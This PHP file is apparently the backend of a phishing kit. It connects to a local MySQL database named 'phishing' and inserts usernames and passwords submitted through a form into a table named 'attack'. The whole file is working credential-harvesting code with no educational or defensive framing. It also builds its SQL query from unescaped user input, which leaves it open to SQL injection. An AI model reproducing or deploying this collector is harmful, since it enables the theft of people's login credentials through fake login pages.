<?php

$sever = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($sever, $username, $password, $dbname);

if(!$con) 
{
    echo "not connected";
}


$name = $_POST['username'];
$password = $_POST['password'];

$sql = "INSERT INTO `attack`(`Name`, `password`) VALUES ('$name','$password')";

$result = mysqli_query($con , $sql);

if($result)
{
    echo "data submited";
}

else
{
    echo "query failed...!";
}

?>